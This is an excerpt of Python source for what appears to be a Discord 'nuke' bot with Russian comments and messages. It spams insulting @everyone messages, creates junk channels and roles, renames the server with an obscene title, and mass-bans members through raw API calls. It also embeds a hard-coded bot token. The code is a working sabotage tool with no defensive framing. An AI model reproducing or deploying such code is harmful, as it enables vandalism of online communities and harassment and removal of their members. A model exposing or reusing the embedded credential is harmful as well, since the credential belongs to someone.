...
prefix = 'di!' # префикс нашего бота
token = 'MTAwNzU3NzQ2MDE3NjU4ODgwMQ.GEAXQa.c3KkRh8OySm6jQ0gsDFbA9OTSHHkx-B9JYPeog' # токен бота
spamtext = '@everyone @here\nВас крашнул бот дед инсайд 228!\nВЫ ЛОХИ!!!!
...
async def createchannel(ctx):
    try: c = await ctx.guild.create_text_channel('лохи')
    except: pass
    else: create_task(sendch(ch=c,text=spamtext,count=5))

async def createrole(ctx):
    try: await ctx.guild.create_role(name='лохи')
    except: pass
...
async def rename(ctx):
    ...
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='сервер которы ебали', icon=icon)
...
async def banus(ctx, limit=None):
    ...
    for member in memlist:
        if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
            continue
        guild = ctx.guild
        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'хаха'}, json={'delete_message_days': 1})
